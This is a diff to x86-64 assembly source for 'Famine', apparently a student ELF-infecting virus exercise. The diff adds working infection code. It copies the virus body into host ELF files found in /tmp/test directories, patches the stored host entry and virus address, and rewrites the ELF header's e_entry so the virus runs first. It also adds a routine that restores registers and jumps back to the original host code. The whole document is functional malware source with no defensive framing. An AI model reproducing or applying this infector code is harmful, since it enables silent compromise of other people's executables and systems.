@@ -1,8 +1,7 @@
 %include "inc/famine.inc"
 
 default rel
-section .pollas
-    holi db "kk",0
+
 section .text
     ; Trazas
     dir db              "[+] dir",10,0  ;9
@@ -13,8 +12,8 @@ section .text
         syscall
 
     _start:
+    PUSH_ALL
     push rsp
-    TRACE_TEXT hello, 11
     ; this trick allows us to access Famine members using the VAR macro
     mov rbp, rsp
     sub rbp, Famine_size            ; allocate Famine struct on stack
@@ -300,20 +299,30 @@ section .text
                     mov qword [rax+Elf64_Phdr.p_align], 0x1000     ; p_align = 0x1000 (4KB)
 
                 .write_payload:
+                   mov rsi, VAR(Famine.virus_entry)
+                   mov rdi, VAR(Famine.mmap_ptr)
+                   add rdi, VAR(Famine.virus_offset)
 
-                    mov rsi, VAR(Famine.virus_entry)
-                    mov rdi, VAR(Famine.mmap_ptr)
-                    add rdi, VAR(Famine.virus_offset)
-                    mov ecx, dword VAR(Famine.virus_size)
-                    cld
-                    rep movsb
-                    mov rax, VAR(Famine.original_entry)
-                    lea rbx, [rdi - 8]
-                    mov [rbx], rax
-                    mov rax, VAR(Famine.mmap_ptr)
-                    add rax, Elf64_Ehdr.e_entry
-                    mov rbx, VAR(Famine.new_entry)
-                    mov [rax], rbx
+                   push rdi                        
+
+                   mov ecx, dword VAR(Famine.virus_size)
+                   cld
+                   rep movsb
+
+                   pop rdi                       
+
+                   ; 1. Parchear host_entry en el mmap
+                   mov rax, VAR(Famine.original_entry)
+                   mov [rdi + (host_entry - _start)], rax
+
+                   ; 2. Parchear virus_vaddr en el mmap
+                   mov rax, VAR(Famine.new_entry)
+                   mov [rdi + (virus_vaddr - _start)], rax
+
+                   ; 3. Cambiar e_entry en el ELF Header
+                   mov rax, VAR(Famine.mmap_ptr)
+                   mov rbx, VAR(Famine.new_entry)
+                   mov [rax + Elf64_Ehdr.e_entry], rbx
 
                 .munmap:
                     ;munmap(map_ptr, )
@@ -330,14 +339,6 @@ section .text
                 mov rdi, VAR(Famine.fd_file)
                 mov rax, SC_CLOSE
                 syscall
-
-            ;.end_openat:
-            ;    pop rax
-                ; jmp .next_file
-
-        ; .next_file:
-        ;     cmp r12, rax
-        ;     jge .validate_files_types
 
         .skip_file:
             pop rax
@@ -360,9 +361,18 @@ section .text
             cmp byte [rdi], 0   ; find double null
             jnz .open_dir
 
-        ; .jump:
-        ;     mov rax, [host_entry]
-        ;     jmp rax
+        .jump:
+            mov rsp, rbp
+            add rsp, Famine_size
+            pop rsp
+            POP_ALL
+
+            ; Calcular dirección de retorno
+            lea rax, [rel _start]        ; Dirección absoluta de _start ahora mismo
+            sub rax, [rel virus_vaddr]   ; Base real (Absoluta - Virtual)
+            add rax, [rel host_entry]    ; Dirección host (Base + Offset)
+
+            jmp rax
 
         .exit:
             pop rsp
@@ -371,5 +381,6 @@ section .text
     dirs db         "/tmp/test",0,"/tmp/test2",0,0
     Traza db         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
     hello db            "[+] Hello",10,0  ;11
-    host_entry  dq   _host  
+    host_entry  dq   _host
+    virus_vaddr dq   _start  
     _finish:
